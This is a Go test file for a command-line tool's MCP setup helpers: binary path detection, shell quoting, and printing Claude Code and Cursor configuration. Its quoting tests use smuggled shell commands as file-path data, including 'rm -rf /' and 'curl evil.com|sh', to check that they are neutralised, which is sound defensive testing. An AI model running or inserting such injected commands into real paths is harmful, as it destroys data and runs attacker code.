package cmd

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestDetectMcpBinaryGopathHit(t *testing.T) {
	tmpDir := t.TempDir()
	binDir := filepath.Join(tmpDir, "bin")
	require.NoError(t, os.MkdirAll(binDir, 0755))
	require.NoError(t, os.WriteFile(filepath.Join(binDir, "hppymcp"), []byte("binary"), 0755))

	t.Setenv("GOPATH", tmpDir)
	got := detectMcpBinary()
	assert.Equal(t, filepath.Join(binDir, "hppymcp"), got)
}

func TestDetectMcpBinaryDefaultGopath(t *testing.T) {
	tmpDir := t.TempDir()
	binDir := filepath.Join(tmpDir, "go", "bin")
	require.NoError(t, os.MkdirAll(binDir, 0755))
	require.NoError(t, os.WriteFile(filepath.Join(binDir, "hppymcp"), []byte("binary"), 0755))

	t.Setenv("GOPATH", "/nonexistent/gopath")
	t.Setenv("HOME", tmpDir)
	got := detectMcpBinary()
	assert.Equal(t, filepath.Join(binDir, "hppymcp"), got)
}

func TestDetectMcpBinaryLocalBin(t *testing.T) {
	tmpDir := t.TempDir()
	// Resolve symlinks (macOS /var -> /private/var) so filepath.Abs matches.
	tmpDir, err := filepath.EvalSymlinks(tmpDir)
	require.NoError(t, err)

	binDir := filepath.Join(tmpDir, "bin")
	require.NoError(t, os.MkdirAll(binDir, 0755))
	require.NoError(t, os.WriteFile(filepath.Join(binDir, "hppymcp"), []byte("binary"), 0755))

	t.Setenv("GOPATH", "/nonexistent/gopath")
	t.Setenv("HOME", "/nonexistent/home")

	origDir, err := os.Getwd()
	require.NoError(t, err)
	require.NoError(t, os.Chdir(tmpDir))
	t.Cleanup(func() { os.Chdir(origDir) })

	got := detectMcpBinary()
	assert.Equal(t, filepath.Join(tmpDir, "bin", "hppymcp"), got)
}

func TestDetectMcpBinaryFallback(t *testing.T) {
	t.Setenv("GOPATH", "/nonexistent/gopath")
	t.Setenv("HOME", "/nonexistent/home")
	got := detectMcpBinary()
	assert.Equal(t, "hppymcp", got)
}

func TestShellQuote(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{"simple path", "/usr/local/bin/hppymcp", "'/usr/local/bin/hppymcp'"},
		{"path with spaces", "/my path/bin/hppymcp", "'/my path/bin/hppymcp'"},
		{"path with single quote", "/it's/bin/hppymcp", "'/it'\\''s/bin/hppymcp'"},
		{"path with semicolon", "/tmp/foo;rm -rf /", "'/tmp/foo;rm -rf /'"},
		{"path with backtick", "/tmp/`whoami`/bin", "'/tmp/`whoami`/bin'"},
		{"path with dollar", "/tmp/$(evil)/bin", "'/tmp/$(evil)/bin'"},
		{"empty string", "", "''"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.expected, shellQuote(tt.input))
		})
	}
}

func TestPrintClaudeConfig(t *testing.T) {
	var buf bytes.Buffer
	err := printClaudeConfig(&buf, "/usr/local/bin/hppymcp", "/home/user/.hppycli.yaml")
	require.NoError(t, err)

	output := buf.String()
	assert.Contains(t, output, "claude mcp add --transport stdio --scope user hppymcp -- '/usr/local/bin/hppymcp' --config '/home/user/.hppycli.yaml'")
	assert.Contains(t, output, "restart Claude Code")
}

func TestPrintClaudeConfigPathsWithSpaces(t *testing.T) {
	var buf bytes.Buffer
	err := printClaudeConfig(&buf, "/my path/bin/hppymcp", "/my config/.hppycli.yaml")
	require.NoError(t, err)

	output := buf.String()
	assert.Contains(t, output, "-- '/my path/bin/hppymcp' --config '/my config/.hppycli.yaml'")
}

func TestPrintClaudeConfigShellMetachars(t *testing.T) {
	var buf bytes.Buffer
	err := printClaudeConfig(&buf, "/tmp/$(whoami)/hppymcp", "/tmp/;curl evil.com|sh")
	require.NoError(t, err)

	output := buf.String()
	assert.Contains(t, output, "'/tmp/$(whoami)/hppymcp'")
	assert.Contains(t, output, "'/tmp/;curl evil.com|sh'")
}

func TestPrintCursorConfig(t *testing.T) {
	var buf bytes.Buffer
	err := printCursorConfig(&buf, "/usr/local/bin/hppymcp", "/home/user/.hppycli.yaml")
	require.NoError(t, err)

	output := buf.String()
	assert.Contains(t, output, "Cursor MCP settings")

	// Extract and validate JSON
	lines := bytes.Split(buf.Bytes(), []byte("\n"))
	var jsonBuf bytes.Buffer
	inJSON := false
	for _, line := range lines {
		trimmed := bytes.TrimSpace(line)
		if len(trimmed) > 0 && trimmed[0] == '{' {
			inJSON = true
		}
		if inJSON {
			jsonBuf.Write(line)
			jsonBuf.WriteByte('\n')
		}
	}
	var parsed map[string]interface{}
	require.NoError(t, json.Unmarshal(jsonBuf.Bytes(), &parsed))
	mcpServers := parsed["mcpServers"].(map[string]interface{})
	hppymcp := mcpServers["hppymcp"].(map[string]interface{})
	assert.Equal(t, "/usr/local/bin/hppymcp", hppymcp["command"])
	args := hppymcp["args"].([]interface{})
	assert.Equal(t, []interface{}{"--config", "/home/user/.hppycli.yaml"}, args)
}
